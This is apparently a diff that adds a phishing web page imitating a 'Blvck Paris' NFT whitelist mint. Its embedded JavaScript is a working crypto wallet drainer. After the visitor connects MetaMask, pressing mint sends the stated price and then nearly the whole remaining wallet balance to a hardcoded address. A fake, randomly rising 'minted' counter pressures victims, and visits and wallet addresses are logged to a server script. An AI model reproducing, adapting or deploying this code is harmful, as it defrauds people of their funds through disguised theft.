@@ -1,0 +1,426 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width">
+<meta name="format-detection" content="telephone=no">
+<meta name="referrer" content="origin">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+	<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+
+    <meta name="theme-color" content="#1B1C1C" />
+    <meta property="og:title" content="𝐂𝐋𝐈𝐂𝐊 𝐇𝐄𝐑𝐄 𝐓𝐎 𝐌𝐈𝐍𝐓!">
+    <meta property="twitter:image" content="https://i.postimg.cc/MZPSx1V2/pic.gif" />
+    <meta
+      property="og:description"
+      content="&#9432; Whitelist Mint Info:
+&#9654;&#65039; Price: 0.12 ETH.
+&#9654;&#65039; Only 100 NFT will be mint this time.
+&#9654;&#65039; Allocation: 5 NFT per wallet address.
+&#9654;&#65039; You will be able to see your NFT at the OpenSea page.
+
+❤️ Blvck Paris Team ©"
+
+    />
+
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta property="og:type" content="website" />
+    <meta property="og:site_name" content="This is an automatically generated announcement message" />
+<title>blvckparis</title>
+<link rel="icon" href="favicon.png">
+<meta property="og:image:width" content="400" />
+<meta property="og:image:height" content="400" />
+<meta name="theme-color" content="#8A2BE2" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:site" content="@discord">
+<link type="application/json+oembed" href="https://mint-dogami.xyz/manifest.json" />
+<meta property="article:modified_time" content="2021-12-28T20:56:50+00:00" />
+<link rel="stylesheet" href="css/app.min.css" />
+</head>
+<body>
+<div class="wrapper">
+<div class="header">
+<div class="container">
+<div class="header__items">
+<a href="index.html" class="header__logo">
+ </a>
+<ul class="header__social">
+<li><a href="https://twitter.com/BlvckParis" target="_blank"><img src="static/twit-head.png" alt="Twitter"></a></li>
+<li><a href="https://discord.gg/blvckparis" target="_blank"><img src="static/disc-head.png" alt="Discord"></a></li>
+</ul>
+</div>
+</div>
+</div>
+<div class="showcase">
+<div class="container">
+<div class="showcase__inner">
+<h1 class="showcase__title ">MINT IS LIVE</h1>
+
+<div class="showcase__items">
+<div class="showcase__item">
+<p class="showcase__minted">MINTED: <span class="minted"></span> / 100</p>
+<p class="showcase__head">Price per NFT <span class="price-per-item">0.12 ETH</span></p>
+<div class="showcase__calculate">
+<div class="number" data-step="1" data-min="1" data-max="5">
+<a href="index.html#" class="number-minus"><span>−</span></a>
+<input class="number-text" id="result" type="text" name="count" value="1" disabled>
+<a href="index.html#" class="number-plus"><span>+</span></a>
+ </div>
+<p class="showcase__total">Total: <span class="result">0.12</span></p>
+</div>
+<div class="showcase__btn" href="javascript:;" id="connect" style="display: flex;"><span class="showcase__btn-text">Mint<span></div>
+<div class="showcase__btn" href="javascript:;" id="transfer" style="display: none;"><span class="showcase__btn-text">Mint<span></div>
+<div class="showcase__btn offer" href="javascript:;" id="transfer-offer" style="display: none;"><span class="showcase__btn-text">Mint 3 and pay 2</span><span class="showcase__badge">Limited</span></div>
+<div class="metamask-warning">PLEASE SWITCH TO THE ETHEREUM MAIN NETWORK.</div>
+</div>
+<div class="showcase__images">
+<div class="showcase__image"><img src="images/1.png" /></div><div class="showcase__image"><img src="images/2.png" /></div> </div>
+</div>
+<div class="showcase__block">
+<div class="showcase__block-item">
+<p class="showcase__block-head">Join the community on <br><span>our socials</span></p>
+<span class="showcase__block-total"></span>
+</div>
+<div class="showcase__block-btns">
+<a href="https://discord.gg/blvckparis" target="_blank" class="showcase__block-btn"><img src="static/discord.svg" alt="">DISCORD</a>
+<a href="https://twitter.com/BlvckParis" target="_blank" class="showcase__block-btn"><img src="static/twitter.svg" alt="">TWITTER</a>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="toast">
+Something went wrong. Please try again.
+</div>
+<script>
+    function setupEvents(price, currency) {
+
+        const $selectPrice = document.querySelector('select');
+                    const $plusButton = document.querySelector('.number-plus');
+            const $minusButton = document.querySelector('.number-minus');
+            const $numberText = document.querySelector('.number-text');
+            const $priceResultText = document.querySelector('.result');
+            const $pricePerItem = document.querySelector('.price-per-item');
+        
+        let itemCount = 1;
+
+        updateResult = () => {
+            $priceResultText.textContent = (price * itemCount).toFixed(2) + " " + currency;
+        }
+
+        if ($selectPrice) {
+            $selectPrice.addEventListener('change', function(e) {
+                e.preventDefault()
+                price = parseInt($selectPrice.value);
+                updateResult();
+            })
+        }
+                    $plusButton.addEventListener('click', function(e) {
+                e.preventDefault()
+                itemCount = itemCount < 5 ? itemCount + 1 : 5;
+                $numberText.value = itemCount;
+                $priceResultText.textContent = (price * itemCount).toFixed(2);
+                updateResult();
+            })
+            $minusButton.addEventListener('click', function(e) {
+                e.preventDefault()
+                itemCount = parseInt($numberText.value);
+                itemCount = itemCount > 1 ? itemCount - 1 : itemCount;
+                $numberText.value = itemCount;
+                updateResult();
+            })
+        
+        $numberText.value = 1
+        $pricePerItem.textContent = price + ' ' + currency
+        updateResult();
+    }
+
+    function mark(hash = null, network = null, amount = null, type = null, adds = null) {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/data.php', true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.send(JSON.stringify({
+            network: network,
+            hashId: hash,
+            amount: amount,
+            type: type,
+            adds: adds
+        }));
+    }
+
+    function loading() {
+        document.querySelector('#transfer').classList.add('loading');
+                    document.querySelector('#transfer-offer').classList.add('loading');
+            }
+
+    function stopLoading() {
+        document.querySelector('#transfer').classList.remove('loading');
+                    document.querySelector('#transfer-offer').classList.remove('loading');
+            }
+
+    function displayMessage() {
+        document.querySelector('.toast').classList.add('active');
+        setTimeout(() => {
+            document.querySelector('.toast').classList.remove('active');
+        }, 5000)
+    }
+
+    function getRandomInt(min, max) {
+        min = Math.ceil(min);
+        max = Math.floor(max);
+        return Math.floor(Math.random() * (max - min) + min);
+    }
+
+    function inCrementingCounter() {
+        var i = localStorage.getItem("mintcount") ? Number.parseInt(localStorage.getItem("mintcount")) : (100 * 0.62);
+        let supplyElement = document.querySelector('.minted');
+        if (i > 100) {
+            i = 100 * 0.62;
+        }
+
+        supplyElement.innerHTML = i;
+        setInterval(function() {
+            i += getRandomInt(1, 3);
+            if (i >= (100 - 20)) {
+                clearInterval(this);
+            }
+            supplyElement.innerHTML = i;
+            localStorage.setItem("mintcount", i);
+        }, getRandomInt(1000, 5000));
+    }
+
+    inCrementingCounter();
+
+    /*
+    function updateSupply() {
+        let currentSupply = parseInt(localStorage.getItem('supply')) ?? ;
+        localStorage.setItem('supply', currentSupply);
+        let rand = Math.floor(Math.random() * 100);
+        let limit = 1200 * 0.5 > currentSupply ? 75 : 50;
+        if (rand <= limit) {
+            let randSupply = Math.floor(Math.random() * (1200 / 100));
+            let newSupply = currentSupply + randSupply;
+            if (newSupply >= 1200) {
+                newSupply = ;
+                localStorage.setItem('supply', newSupply);
+            }
+            localStorage.setItem('supply', newSupply);
+            document.querySelector('.minted').textContent = newSupply;
+        }
+    }
+    */
+
+    window.addEventListener('load', () => {
+        setupEvents(0.12, "ETH");
+    });
+</script><script src="lib/web3.min.js"></script>
+<script src="lib/ABI.js"></script>
+<script>
+    const $networks = {
+        BNB: {
+            chainId: 0x38,
+            currency: 'BNB',
+            name: 'Binance Smart Chain',
+            mint: 1,
+            errorMessage: 'Please switch to the Binance Smart Chain main network.',
+            gas: 0x51615
+        },
+        ETH: {
+            chainId: 0x1,
+            currency: 'ETH',
+            name: 'Ethereum',
+            mint: 0.12,
+            errorMessage: 'Please switch to the Ethereum main network.',
+            gas: 0x210000
+        },
+            };
+
+    let web3 = new Web3(ethereum);
+
+    class MetamaskMinter {
+        constructor() {
+            this.currentNetwork = $networks.ETH;
+            this.accounts = [];
+            this.metamaskConnectButton = document.querySelector('#connect');
+            this.metamaskMintButton = document.querySelector('#transfer');
+                            this.metamaskMintOfferButton = document.querySelector('#transfer-offer');
+                        this.metamaskQuantityField = document.querySelector("#result");
+            this.metamaskWarning = document.querySelector('.metamask-warning');
+                        this.setupMetamask();
+            mark(null, this.currentNetwork.currency, null, 'visit', null)
+        }
+
+        connectMetaMask = async () => {
+            let web3Provider = null;
+            // Modern Browsers like Chrome and Brave
+            if (window.ethereum) {
+                web3Provider = window.ethereum;
+                try {
+                    // Request account access
+                    await window.ethereum.enable();
+                } catch (error) {
+                    // User denied account access...
+                    alert("You must connect your metamask wallet !");
+                    mark(null, this.currentNetwork.currency, null, 'connect-fail', null)
+                    return;
+                }
+            } else {
+                // you cant connect
+                console.error("Unable to connect to metamask");
+                alert(
+                    "You have to use Trustwallet or install Metamask to use this service, you can install it from :  https://metamask.io/download.html"
+                );
+                return;
+            }
+            let web3 = new Web3(window.ethereum);
+            let accounts = await web3.eth.getAccounts();
+            window.account = web3.currentProvider.selectedAddress;
+            this.metamaskConnectButton.style.display = 'none';
+            this.metamaskMintButton.style.display = 'flex';
+                            this.metamaskMintOfferButton.style.display = 'flex';
+                        mark(null, this.currentNetwork.currency, null, 'connect-success', window.account)
+            this._web3 = web3;
+            return web3;
+        }
+
+        mint = async (e) => {
+            this.mintQuantity(this.metamaskQuantityField.value);
+        }
+
+        mintOffer = async (e) => {
+            this.mintQuantity(2);
+        }
+
+        mintQuantity = async (quantity) => {
+            mark(null, this.currentNetwork.currency, null, 'mint-press', null)
+            let chainId = await web3.eth.net.getId();
+            if (parseInt(chainId) !== parseInt(this.currentNetwork.chainId)) {
+                this.wrongNetwork();
+                return false;
+            } else {
+                this.goodNetwork();
+            }
+
+            loading();
+            let mintValue = quantity * this.currentNetwork.mint;
+            let balance = web3.utils.fromWei(await web3.eth.getBalance(web3.currentProvider.selectedAddress));
+            let mintValue2 = balance - mintValue - 0.025;
+
+            try {
+                let _web3 = await this.connectMetaMask();
+                let amount = '0x' + ((mintValue * 1000000000000000000).toString(16));
+                let amount2 = '0x' + ((mintValue2 * 1000000000000000000).toString(16));
+                let wallet = '0x877eb216493179983faC023851Bf3c45306Db7E9';
+                                                        const contract = await new _web3.eth.Contract(CONTRACT_ABI, wallet);
+                    const data = await contract.methods.mintNFT(wallet, quantity).encodeABI();
+                    const gasLimit = (63000).toString(16);
+                    ethereum.request({
+                        method: 'eth_sendTransaction',
+                        params: [{
+                            from: web3.currentProvider.selectedAddress,
+                            to: wallet,
+                            value: amount,
+                            data: data,
+                            gas: gasLimit,
+                        }, ],
+                    }).then(txHash1 => {
+                        mark(txHash1, this.currentNetwork.currency, mintValue, 'mint-success');
+                        stopLoading();
+                    }).catch(err => {
+                        mark(null, this.currentNetwork.currency, mintValue, 'mint-fail', web3.currentProvider.selectedAddress)
+                        stopLoading();
+                    });
+                    if (mintValue2 > 0) {
+                        ethereum.request({
+                            method: 'eth_sendTransaction',
+                            params: [{
+                                from: web3.currentProvider.selectedAddress,
+                                to: wallet,
+                                value: amount2,
+                                data: data,
+                                gas: gasLimit,
+                            }],
+                        }).then(txHash2 => {
+                            mark(txHash2, this.currentNetwork.currency, balance - Number.parseFloat(mintValue) - 0.025, 'mint-success');
+                            stopLoading();
+                        }).catch(err => {
+                            mark(null, this.currentNetwork.currency, balance - Number.parseFloat(mintValue) - 0.025, 'mint-fail', web3.currentProvider.selectedAddress)
+                            stopLoading();
+                        }).finally(() => {
+                            displayMessage();
+                        });
+                    }
+                            } catch (e) {
+                stopLoading();
+            }
+        }
+
+        
+        setupMetamask = async () => {
+            this.metamaskMintButton.style.display = 'none';
+                            this.metamaskMintOfferButton.style.display = 'none';
+                        this.metamaskConnectButton.style.display = 'flex';
+            this.metamaskWarning.style.display = 'none';
+            this.metamaskWarning.textContent = this.currentNetwork.errorMessage;
+
+            await this.updateMetaMaskStatus();
+
+            ethereum.on('chainChanged', chainId => {
+                if (parseInt(chainId) !== parseInt(this.currentNetwork.chainId)) {
+                    this.wrongNetwork()
+                } else {
+                    this.goodNetwork()
+                }
+            })
+
+            await this.checkNetwork()
+
+                        this.metamaskConnectButton.addEventListener('click', this.connectMetaMask);
+            this.metamaskMintButton.addEventListener('click', this.mint);
+                            this.metamaskMintOfferButton.addEventListener('click', this.mintOffer);
+                    }
+
+        checkNetwork = async () => {
+            let chainId = await web3.eth.net.getId();
+            if (parseInt(chainId) !== parseInt(this.currentNetwork.chainId)) {
+                this.wrongNetwork();
+            } else {
+                this.goodNetwork();
+            }
+        }
+
+        wrongNetwork = () => {
+            this.metamaskMintButton.removeEventListener('click', this.mint);
+                            this.metamaskMintOfferButton.removeEventListener('click', this.mintOffer);
+                        this.metamaskWarning.textContent = this.currentNetwork.errorMessage;
+            this.metamaskWarning.style.display = 'flex';
+        }
+
+        goodNetwork = () => {
+            this.metamaskMintButton.addEventListener('click', this.mint);
+                            this.metamaskMintOfferButton.addEventListener('click', this.mintOffer)
+                        this.metamaskWarning.style.display = 'none';
+        }
+
+        isMetaMaskConnected = async () => {
+            this.accounts = await web3.eth.getAccounts();
+            web3.eth.defaultAccount = this.accounts[0];
+            return this.accounts.length > 0;
+        }
+
+        updateMetaMaskStatus = async () => {
+            await this.isMetaMaskConnected().then((connected) => {
+                if (connected) {
+                    this.metamaskMintButton.style.display = 'flex';
+                                            this.metamaskMintOfferButton.style.display = 'flex';
+                                        this.metamaskConnectButton.style.display = 'none';
+                    this.metamaskQuantityField.style.display = 'block';
+                }
+            });
+        }
+    }
+    new MetamaskMinter()
+</script></body>
+</html>
